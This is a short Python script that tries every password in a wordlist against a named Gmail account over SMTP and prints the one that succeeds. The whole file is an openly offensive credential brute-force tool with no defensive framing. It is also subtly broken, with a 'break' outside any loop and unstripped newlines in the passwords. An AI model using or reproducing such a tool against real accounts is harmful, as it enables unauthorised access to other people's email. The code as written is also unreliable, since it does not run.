import smtplib 
import sys 

user = str(sys.argv[1])
passwdfile = str(sys.argv[2])

server = 'smtp.gmail.com' 
port = 587 

smtp = smtplib.SMTP(server, port) 
smtp.ehlo() 
smtp.starttls() 

def connect(user, passwd): 
    try: 
        smtp.login(user, passwd) 
        print('[*] Password found: %s' % (passwd)) 
        break
    except: 
        print('[*] Attempting password %s ' % (passwd)) 

file = open(passwdfile, 'r') 

for word in file: 
    connect(user, word)
